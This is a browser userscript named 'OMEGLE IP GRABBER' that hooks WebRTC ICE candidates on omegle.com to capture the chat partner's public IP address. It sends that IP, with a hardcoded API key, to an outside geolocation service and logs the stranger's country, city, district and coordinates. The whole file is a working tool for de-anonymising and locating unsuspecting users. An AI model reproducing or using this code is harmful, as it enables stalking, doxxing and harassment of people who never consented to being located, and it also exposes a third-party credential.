// ==UserScript==
// @name         OMEGLE IP GRABBER
// @version      1
// @author       Aentix
// @match        https://www.omegle.com/*
// @icon         https://www.google.com/s2/favicons?domain=omegle.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

const apiKey = "9bbaca38ecd64f3082475f865fc90097";

window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate

    pc.addIceCandidate = function(iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest)
    };
    return pc;
};

const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `
        -----------------------
        Country: ${json.country_name}
        State: ${json.state_prov}
        City: ${json.city}
        IP: ${json.ip}
        District: ${json.district}
        Lat / Long: (${json.latitude}, ${json.longitude})
        -----------------------
        `;
            console.log(output)
        })
    );
}
})();
